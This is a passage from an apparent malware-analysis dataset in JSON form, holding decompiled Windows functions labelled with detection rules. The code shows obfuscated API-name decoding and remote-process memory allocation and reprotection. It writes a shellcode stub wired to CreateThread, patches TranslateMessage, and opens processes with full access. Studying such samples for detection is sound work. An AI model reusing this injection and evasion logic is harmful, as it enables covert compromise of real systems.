_sym.imp.ntdll.dll_RtlFreeHeap;\n        var_50h = iVar17 >> 0x20;\n        var_180h = iVar17;\n        var_188h = uVar18 >> 0x20;\n        var_20h = uVar18;\n        var_1ch = uVar19 >> 0x20;\n        var_178h = uVar19;\n        (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar11);\n        var_50h = iVar17 >> 0x20;\n        var_180h = iVar17;\n        var_188h = uVar18 >> 0x20;\n        var_20h = uVar18;\n        var_1ch = uVar19 >> 0x20;\n        var_178h = uVar19;\n        uVar11 = (*pcVar4)(0, var_ch);\n        pcVar4 = _sym.imp.KERNEL32.dll_HeapFree;\n        var_50h = iVar17 >> 0x20;\n        var_180h = iVar17;\n        var_188h = uVar18 >> 0x20;\n        var_20h = uVar18;\n        var_1ch = uVar19 >> 0x20;\n        var_178h = uVar19;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar11);\n        pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        var_50h = iVar17 >> 0x20;\n        var_180h = iVar17;\n        var_188h = uVar18 >> 0x20;\n        var_20h = uVar18;\n        var_1ch = uVar19 >> 0x20;\n        var_178h = uVar19;\n        uVar11 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar12);\n        var_50h = iVar17 >> 0x20;\n        var_180h = iVar17;\n        var_188h = uVar18 >> 0x20;\n        var_20h = uVar18;\n        var_1ch = uVar19 >> 0x20;\n        var_178h = uVar19;\n        (*pcVar6)(uVar11);\n        var_50h = iVar17 >> 0x20;\n        var_180h = iVar17;\n        var_188h = uVar18 >> 0x20;\n        var_20h = uVar18;\n        var_1ch = uVar19 >> 0x20;\n        var_178h = uVar19;\n        uVar11 = (*pcVar5)(0, var_54h);\n        var_50h = iVar17 >> 0x20;\n        var_180h = iVar17;\n        var_188h = uVar18 >> 0x20;\n        var_20h = uVar18;\n        var_1ch = uVar19 >> 0x20;\n        var_178h = uVar19;\n        (*pcVar4)(uVar11);\n        var_50h = iVar17 >> 0x20;\n        var_180h = iVar17;\n        var_188h = uVar18 >> 0x20;\n        var_20h = uVar18;\n        var_1ch = uVar19 >> 0x20;\n        var_178h = uVar19;\n    }\n    else {\n        var_ach = 0xb8515350;\n        var_a8h = 0x55555555;\n        var_a4h = 0x74013883;\n        var_a0h = 0x100c725;\n        var_9ch = 0x31000000;\n        var_98h = 0x685050c0;\n        var_94h = 0x11223344;\n        var_90h = 0x66778868;\n        var_8ch = 0xbb505055;\n        var_88h = 0x11111111;\n        var_84h = 0xb950d3ff;\n        var_80h = 0x22222222;\n        var_7ch = 0x5b59d1ff;\n        var_78h = 0xe5895558;\n        iVar16 = (*_sym.imp.KERNEL32.dll_VirtualAllocEx)(*in_ECX, 0, 0x38, 0x3000, 0x20);\n        var_10h = (*pcVar4)(*in_ECX, 0, 5, 0x3000, 0x20);\n        if (var_10h != NULL) {\n            fcn.0040cbb0(var_10h);\n            iVar13 = (*_sym.imp.KERNEL32.dll_VirtualProtectEx)(*in_ECX, var_10h, 5, 0x40, &fcn.0040bbc2::lpflOldProtect)\n            ;\n            if (iVar13 != 0) {\n                iVar13 = fcn.0040cb6a(&fcn.0040bbc2::var_ch, 5);\n                if (iVar13 != 0) {\n                    var_68h = var_10h;\n                }\n                (*_sym.imp.KERNEL32.dll_VirtualProtectEx)\n                          (*in_ECX, var_10h, 5, lpflOldProtect, &fcn.0040bbc2::lpflOldProtect);\n            }\n        }\n        if (iVar16 != 0) {\n            (*_sym.imp.KERNEL32.dll_VirtualProtectEx)(*in_ECX, iVar16, 0x3d, 0x40, &fcn.0040bbc2::lpflOldProtect);\n            fcn.0040cbb0(iVar16 + 0x38);\n            var_a8h = iVar16 + 0x3d;\n            var_90h = var_90h & 0xff | var_68h << 8;\n            var_8ch = var_8ch & 0xffffff00 | var_68h >> 0x18;\n            var_94h = arg_8h;\n            var_88h = _sym.imp.KERNEL32.dll_CreateThread;\n            var_80h = _sym.imp.KERNEL32.dll_CloseHandle;\n            iVar13 = fcn.0040cb6a(&fcn.0040bbc2::var_ach, 0x38);\n            if ((iVar13 != 0) && (iVar13 = fcn.0040cb6a(&fcn.0040bbc2::var_ch, 5),  iVar13 != 0)) {\n                fcn.0040cbb0(_sym.imp.USER32.dll_TranslateMessage);\n                (*_sym.imp.KERNEL32.dll_VirtualProtectEx)\n                          (*in_ECX, _sym.imp.USER32.dll_TranslateMessage, 0x400, 0x40, &fcn.0040bbc2::lpflOldProtect);\n                uVar11 = _sym.imp.USER32.dll_TranslateMessage;\n                iVar13 = fcn.0040cb6a(&fcn.0040bbc2::var_ch, 5);\n                if (iVar13 != 0) {\n                    var_17ch = 1;\n                    *arg_10h = iVar16;\n                }\n                (*_sym.imp.KERNEL32.dll_VirtualProtectEx)\n                          (*in_ECX, uVar11, 0x400, lpflOldProtect, &fcn.0040bbc2::lpflOldProtect);\n            }\n        }\n    }\n    return var_17ch;\n}\n",
        "token_count": 8920
    },
    "0040d287": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040d287(uint param_1, uchar *param_2)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    char cVar4;\n    char cVar5;\n    uint uVar6;\n    uint *puVar7;\n    code *pcVar8;\n    code *pcVar9;\n    uint uVar10;\n    int32_t iVar11;\n    uchar *puVar12;\n    uint *puVar13;\n    uchar *puVar14;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uchar *var_58h;\n    uint *var_54h;\n    uint var_50h;\n    uint *var_4ch;\n    uint hObject;\n    uint dwBytes;\n    uint var_40h;\n    uint lpLibFileName;\n    int32_t var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint *var_14h;\n    uint var_10h;\n    uint *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = 0x41d123d;\n    puVar7 = &var_78h;\n    var_58h = param_2;\n    for (iVar11 = 0x18; iVar11 != 0; iVar11 = iVar11 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    var_60h = *0x4279e0;\n    var_5ch = 0;\n    dwBytes = 0;\n    var_40h = 0;\n    var_14h = 0xa37601c;\n    var_10h._0_2_ = 0x6815;\n    var_8h = 0x68796653;\n    var_4h._0_2_ = 0x4e70;\n    fcn.0040826e(0);\n    iVar11 = 0;\n    do {\n        fcn.004034cf(iVar11, *(&var_8h + iVar11 % 6) ^ *(&var_18h + iVar11));\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 10);\n    var_1ch = 0x273d2f13;\n    var_18h = 0x2a19071c;\n    var_14h = 0x1a1c341d;\n    var_10h._0_2_ = 0x583a;\n    var_8h = 0x57725849;\n    var_4h._0_2_ = 0x6979;\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xf);\n    puVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    var_ch = NULL;\n    *puVar7 = 0;\n    puVar7[1] = 0;\n    puVar7[2] = 0;\n    *(puVar7 + 3) = 0;\n    *(puVar7 + 0xe) = 0;\n    var_38h = &var_1ch - puVar7;\n    var_4ch = puVar7;\n    do {\n        puVar13 = var_ch;\n        pcVar1 = var_ch + puVar7;\n        cVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_8h + puVar13 % 6);\n        uVar3 = pcVar1[var_38h];\n        cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        var_ch = var_ch + 1;\n        *pcVar1 = cVar5 + ((uVar2 ^ uVar3) - cVar4);\n    } while (var_ch < 0xe);\n    uVar6 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, puVar7);\n    pcVar8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar6);\n    var_78h = 0x18;\n    var_74h = 0;\n    var_6ch = 0;\n    var_70h = 0;\n    var_68h = 0;\n    var_64h = 0;\n    iVar11 = (*pcVar8)(&var_50h, 0x400, &var_78h, &var_60h);\n    pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar6 = var_40h;\n    if (-1 < iVar11) {\n        var_30h = 0x3108311b;\n        var_2ch = 0x35162f1c;\n        var_28h = 0x35241a2e;\n        var_24h = 0x2a161534;\n        var_20h._0_2_ = 0x2923;\n        var_20h._2_2_ = CONCAT11(var_20h._3_1_, 0x41);\n        var_14h = 0x41474641;\n        var_10h._0_2_ = CONCAT11(var_10h._1_1_, 0x79);\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n        puVar7 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar6);\n        var_ch = NULL;\n        *puVar7 = 0;\n        puVar7[1] = 0;\n        puVar7[2] = 0;\n        puVar7[3] = 0;\n        puVar7[4] = 0;\n        var_38h = &var_30h - puVar7;\n        var_54h = puVar7;\n        do {\n            puVar13 = var_ch;\n            pcVar1 = var_ch + puVar7;\n            cVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar2 = *(&var_14h + puVar13 % 5);\n            uVar3 = pcVar1[var_38h];\n            cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            var_ch = var_ch + 1;\n            *pcVar1 = cVar5 + ((uVar2 ^ uVar3) - cVar4);\n        } while (var_ch < 0x13);\n        uVar6 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, puVar7);\n        pcVar8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar6);\n        iVar11 = (*pcVar8)(var_50h, 8, &hObject);\n        pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar6 = var_40h;\n        if (-1 < iVar11) {\n            var_34h = 0xc301415;\n            var_30h = 0x281a3d07;\n            var_2ch = 0x11200417;\n            var_28h = 0x2616180c;\n            var_24h = 0xd2d0f0c;\n            var_20h._0_2_ = 0x624;\n            var_20h._2_2_ = 0x790f;\n            var_8h = 0x7961634f;\n            var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x62);\n            uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n            puVar7 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar6);\n            puVar13 = puVar7;\n            for (iVar11 = 6; iVar11 != 0; iVar11 = iVar11 + -1) {\n                *puVar13 = 0;\n                puVar13 = puVar13 + 1;\n            }\n            var_ch = NULL;\n            *puVar13 = 0;\n            var_38h = &var_34h - puVar7;\n            var_14h = puVar7;\n            do {\n                iVar11 = var_ch;\n                pcVar1 = var_ch + puVar7;\n                cVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                uVar2 = *(&var_8h + iVar11 % 5);\n                uVar3 = pcVar1[var_38h];\n                cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                var_ch = var_ch + 1;\n                *pcVar1 = cVar5 + ((uVar2 ^ uVar3) - cVar4);\n            } while (var_ch < 0x18);\n            uVar6 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, puVar7);\n            pcVar9 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar6);\n            (*pcVar9)(hObject, 1, 0, 0, &dwBytes);\n            pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, dwBytes);\n            var_ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n            uVar6 = var_40h;\n            if (var_ch != NULL) {\n                iVar11 = (*pcVar9)(hObject, 1, var_ch, dwBytes, &dwBytes);\n                uVar6 = var_40h;\n                if (-1 < iVar11) {\n                    puVar12 = *var_ch;\n                    puVar14 = var_58h;\n                    for (iVar11 = 0x1c; iVar11 != 0; iVar11 = iVar11 + -1) {\n                        *puVar14 = *puVar12;\n                        puVar12 = puVar12 + 1;\n                        puVar14 = puVar14 + 1;\n                    }\n                    puVar7 = var_14h;\n                    uVar6 = 1;\n                }\n                uVar10 = (*pcVar8)(0, var_ch);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar10);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n            uVar10 = (*pcVar8)(0, puVar7);\n            (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar10);\n        }\n        puVar7 = var_4ch;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(var_50h);\n        uVar10 = (*pcVar8)(0, var_54h);\n        (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar10);\n    }\n    uVar10 = (*pcVar8)(0, puVar7);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar10);\n    uVar10 = (*pcVar8)(0, lpLibFileName);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar10);\n    return uVar6;\n}\n",
        "token_count": 2563
    },
    "0040d605": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.0040d605(int32_t *param_1, int32_t *param_2)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    char cVar6;\n    char cVar7;\n    uint uVar8;\n    uint *puVar9;\n    uint extraout_ECX;\n    int32_t iVar10;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t *var_20h;\n    code *var_1ch;\n    uint var_18h;\n    int32_t *var_14h;\n    int32_t var_10h;\n    int32_t *var_ch;\n    int32_t lpLibFileName;\n    int32_t var_4h;\n    \n    var_10h = 0;\n    iVar10 = -0x3fffffdd;\n    if ((((param_1 != NULL) && (param_2 != NULL)) && (*param_1 != 0)) && (var_ch = param_1[1],  var_ch != NULL)) {\n        if (*param_1 == *var_ch) {\n            var_34h = 0x71352523;\n            var_30h = 0x343e1256;\n            var_2ch = 0x22144145;\n            var_28h = 0x1746772a;\n            var_24h = 0x33473c37;\n            var_1ch = 0x35595171;\n            var_18h._0_2_ = CONCAT11(var_18h._1_1_, 0x33);\n            var_20h = param_2;\n            var_14h = param_1;\n            uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n            puVar9 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar8);\n            lpLibFileName = 0;\n            *puVar9 = 0;\n            puVar9[1] = 0;\n            puVar9[2] = 0;\n            puVar9[3] = 0;\n            puVar9[4] = 0;\n            *(puVar9 + 5) = 0;\n            var_4h = &var_34h - puVar9;\n            do {\n                iVar10 = lpLibFileName;\n                pcVar1 = lpLibFileName + puVar9;\n                cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                uVar2 = *(&var_1ch + iVar10 % 5);\n                uVar3 = pcVar1[var_4h];\n                cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                lpLibFileName = lpLibFileName + 1;\n                *pcVar1 = cVar7 + ((uVar2 ^ uVar3) - cVar6);\n            } while (lpLibFileName < 0x14);\n            var_2ch = 0x41d123d;\n            var_28h = 0xa37601c;\n            var_24h = CONCAT22(var_24h._2_2_, 0x6815);\n            var_1ch = 0x68796653;\n            var_18h._0_2_ = 0x4e70;\n            fcn.0040826e(extraout_ECX);\n            iVar10 = 0;\n            do {\n                fcn.004034cf(iVar10, *(&var_1ch + iVar10 % 6) ^ *(&var_2ch + iVar10));\n                iVar10 = iVar10 + 1;\n            } while (iVar10 < 10);\n            uVar8 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, puVar9);\n            var_1ch = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar8);\n            piVar5 = var_ch;\n            uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, var_ch[1]);\n            var_4h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n            iVar10 = *piVar5;\n            iVar4 = var_14h[1];\n            fcn.00410082();\n            piVar5 = var_ch;\n            iVar10 = (*var_1ch)(2, var_4h, var_ch[1], iVar4 + 0xc, iVar10 + -0xc, &var_10h);\n            if (iVar10 == 0) {\n                if (var_10h == piVar5[1]) {\n                    var_20h[1] = var_4h;\n                    *var_20h = var_10h;\n                }\n                else {\n                    uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_4h);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n                    iVar10 = -0x3fffff85;\n                }\n            }\n            uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpLibFileName);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n            uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar9);\n            (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar8);\n        }\n        else {\n            iVar10 = -0x3fffff85;\n        }\n    }\n    return iVar10;\n}\n",
        "token_count": 1256
    },
    "0040d8ef": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040d8ef(code *param_1, uint param_2)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    char cVar7;\n    char cVar8;\n    uint uVar9;\n    int32_t *piVar10;\n    uint uVar11;\n    uint uVar12;\n    uint extraout_ECX;\n    int32_t iVar13;\n    int32_t *piVar14;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    code *var_1ch;\n    uint var_18h;\n    int32_t *var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint lpLibFileName;\n    int32_t dwSize;\n    \n    var_10h = 0xffffffff;\n    iVar13 = 0;\n    var_1ch = param_1;\n    var_18h = param_2;\n    if (*0x427b54 == NULL) {\n        var_30h = 0x41d123d;\n        var_2ch = 0xa37601c;\n        var_28h._0_2_ = 0x6815;\n        var_24h = 0x68796653;\n        var_20h._0_2_ = 0x4e70;\n        fcn.0040826e(param_1);\n        do {\n            fcn.004034cf(iVar13, *(&var_24h + iVar13 % 6) ^ *(&var_30h + iVar13));\n            iVar13 = iVar13 + 1;\n        } while (iVar13 < 10);\n        var_4ch = 0xf633f17;\n        var_48h = 0x61322b2b;\n        var_44h = 0x2e2d3d03;\n        var_40h = 0x3f20335f;\n        var_3ch = 0x2f174024;\n        var_38h = 0x145d222d;\n        var_34h._0_1_ = 0x4e;\n        var_24h = 0x7a324b59;\n        var_20h._0_2_ = CONCAT11(var_20h._1_1_, 0x4e);\n        fcn.0040351e(extraout_ECX);\n        iVar13 = var_14h;\n        var_14h = &var_4ch - var_14h;\n        var_ch = 0;\n        do {\n            iVar6 = var_ch;\n            pcVar1 = var_ch + iVar13;\n            cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar2 = *(&var_24h + iVar6 % 5);\n            uVar3 = pcVar1[var_14h];\n            cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            var_ch = var_ch + 1;\n            *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n        } while (var_ch < 0x19);\n        uVar9 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar13);\n        *0x427b54 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar9);\n        pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar13);\n        pcVar4 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar9);\n        uVar9 = (*pcVar5)(0, lpLibFileName);\n        (*pcVar4)(uVar9);\n    }\n    dwSize = 0;\n    iVar13 = (**0x427b54)(5, 0, 0, &dwSize);\n    if (iVar13 == -0x3ffffffc) {\n        dwSize = dwSize + 0x100;\n        piVar10 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, dwSize, 0x3000, 4);\n        if (piVar10 != NULL) {\n            var_14h = piVar10;\n            iVar13 = (**0x427b54)(5, piVar10, dwSize, 0);\n            uVar9 = var_18h;\n            if (-1 < iVar13) {\n                var_10h = 0;\n                piVar14 = piVar10;\n                do {\n                    iVar13 = piVar14[0x11];\n                    if (((iVar13 != 0) && (iVar13 != 4)) && (iVar13 != *0x4279e0)) {\n                        uVar11 = fcn.0040dddd();\n                        uVar12 = fcn.0040a52c();\n                        iVar13 = (*var_1ch)(piVar14[0xf], uVar12, piVar14[0x11], piVar14[0x12], uVar11, uVar9);\n                        piVar10 = var_14h;\n                        if (iVar13 == 0) break;\n                    }\n                    piVar10 = var_14h;\n                    if (*piVar14 == 0) break;\n                    piVar14 = piVar14 + *piVar14;\n                } while( true );\n            }\n            (*_sym.imp.KERNEL32.dll_VirtualFree)(piVar10, 0, 0x8000);\n        }\n    }\n    return var_10h;\n}\n",
        "token_count": 1330
    },
    "0040e1ce": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040e1ce(uint arg_8h, uint arg_ch)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    code *pcVar4;\n    char cVar5;\n    char cVar6;\n    uint uVar7;\n    uint *puVar8;\n    code *pcVar9;\n    uint uVar10;\n    int32_t iVar11;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint lpModuleName;\n    \n    var_20h = 0x41d123d;\n    var_1ch = 0xa37601c;\n    var_18h._0_2_ = 0x6815;\n    var_10h = 0x68796653;\n    var_ch._0_2_ = 0x4e70;\n    fcn.0040826e();\n    iVar11 = 0;\n    do {\n        fcn.004034cf(iVar11, *(&var_10h + iVar11 % 6) ^ *(&var_20h + iVar11));\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 10);\n    var_30h = 0x273d2f13;\n    var_2ch = 0x2a19071c;\n    var_28h = 0x1a1c341d;\n    var_24h._0_2_ = 0x583a;\n    var_1ch = 0x57725849;\n    var_18h._0_2_ = 0x6979;\n    uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xf);\n    puVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar7);\n    var_8h = 0;\n    *puVar8 = 0;\n    puVar8[1] = 0;\n    puVar8[2] = 0;\n    *(puVar8 + 3) = 0;\n    *(puVar8 + 0xe) = 0;\n    var_10h = &var_30h - puVar8;\n    do {\n        iVar11 = var_8h;\n        pcVar1 = var_8h + puVar8;\n        cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_1ch + iVar11 % 6);\n        uVar3 = pcVar1[var_10h];\n        cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        var_8h = var_8h + 1;\n        *pcVar1 = cVar6 + ((uVar2 ^ uVar3) - cVar5);\n    } while (var_8h < 0xe);\n    uVar7 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName);\n    pcVar9 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar7, puVar8);\n    uVar7 = (*pcVar9)(var_14h, 0x1f0fff, arg_8h, arg_ch);\n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar10 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar8);\n    pcVar9 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar10);\n    uVar10 = (*pcVar4)(0, lpModuleName);\n    (*pcVar9)(uVar10);\n    return uVar7;\n}\n",
        "token_count": 880
    },
    "0040eb55": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040eb55(uint param_1)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    uint *puVar4;\n    char cVar5;\n    char cVar6;\n    uint uVar7;\n    uint *puVar8;\n    uint uVar9;\n    code *pcVar10;\n    int32_t iVar11;\n    code *pcVar12;\n    uint var_50h;\n    uint var_4ch;\n    uint var_47h;\n    uint var_43h;\n    uint var_3fh;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uint *var_1ch;\n    int32_t var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint *var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    if ((*0x427b68 | *0x427b6c) != 0) {\ncode_r0x0040ef58:\n        var_ch = 0x427b68;\n        goto code_r0x0040ef5d;\n    }\n    var_30h = 0x41d123d;\n    var_2ch._0_1_ = 0x1c;\n    var_2ch._1_1_ = 0x60;\n    var_2ch._2_2_ = 0xa37;\n    var_28h._0_2_ = 0x6815;\n    var_24h = 0x68796653;\n    var_20h._0_2_ = 0x4e70;\n    fcn.0040826e(param_1);\n    iVar11 = 0;\n    do {\n        fcn.004034cf(iVar11, *(&var_24h + iVar11 % 6) ^ *(&var_30h + iVar11));\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 10);\n    var_38h = 0x52202331;\n    var_34h = 0x3a04203d;\n    var_30h = 0x17315213;\n    var_2ch._0_1_ = 0x3f;\n    var_2ch._1_1_ = 0x3c;\n    var_2ch._2_2_ = 0x5215;\n    var_28h._0_2_ = 0x728;\n    var_28h._2_1_ = 0x6b;\n    var_24h = 0x3767546b;\n    var_20h._0_2_ = 0x6349;\n    uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n    puVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar7);\n    var_14h = NULL;\n    *puVar8 = 0;\n    puVar8[1] = 0;\n    puVar8[2] = 0;\n    puVar8[3] = 0;\n    puVar8[4] = 0;\n    var_1ch = &var_38h - puVar8;\n    var_8h = puVar8;\n    do {\n        puVar4 = var_14h;\n        pcVar1 = var_14h + puVar8;\n        cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_24h + puVar4 % 6);\n        uVar3 = *(var_1ch + pcVar1);\n        cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar7 = var_4h;\n        var_14h = var_14h + 1;\n        *pcVar1 = cVar6 + ((uVar2 ^ uVar3) - cVar5);\n    } while (var_14h < 0x13);\n    *0x427b68 = fcn.0040f0a7(puVar8);\n    pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (*0x427b68 == 0) {\n        uVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h);\n        var_4h = uVar7;\n        pcVar12 = _sym.imp.KERNEL32.dll_HeapFree;\n    }\n    else {\n        var_38h = 0x7372f19;\n        var_34h = 0xa37003c;\n        var_30h = 0x2c3b2d16;\n        var_2ch._0_1_ = 0x30;\n        var_2ch._1_1_ = 10;\n        var_2ch._2_2_ = 0x263a;\n        var_28h._0_2_ = 0x39;\n        var_28h._2_1_ = 0x62;\n        var_24h = 0x62645843;\n        var_20h._0_2_ = CONCAT11(var_20h._1_1_, 0x48);\n        uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n        puVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar7);\n        var_14h = NULL;\n        *puVar8 = 0;\n        puVar8[1] = 0;\n        puVar8[2] = 0;\n        puVar8[3] = 0;\n        puVar8[4] = 0;\n        var_1ch = &var_38h - puVar8;\n        var_10h = puVar8;\n        do {\n            puVar4 = var_14h;\n            pcVar1 = var_14h + puVar8;\n            cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar2 = *(&var_24h + puVar4 % 5);\n            uVar3 = pcVar1[var_1ch];\n            cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar7 = var_4h;\n            var_14h = var_14h + 1;\n            *pcVar1 = cVar6 + ((uVar2 ^ uVar3) - cVar5);\n        } while (var_14h < 0x13);\n        *0x427b70 = fcn.0040f0a7(puVar8);\n        pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (*0x427b70 == 0) {\ncode_r0x0040ed52:\n            var_4h = uVar7;\n            uVar7 = (*pcVar10)(0, var_10h);\n            pcVar12 = _sym.imp.KERNEL32.dll_HeapFree;\n        }\n        else {\n            var_38h = 0x3100110d;\n            var_34h = 0x33e0144;\n            var_30h = 0x4521f3a;\n            var_2ch._0_1_ = 0x32;\n            var_2ch._1_1_ = 5;\n            var_2ch._2_2_ = 0x3939;\n            var_28h._0_2_ = 0x395b;\n            var_28h._2_1_ = 0x57;\n            var_24h = 0x504d6657;\n            var_20h._0_2_ = 0x5734;\n            uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n            puVar8 = 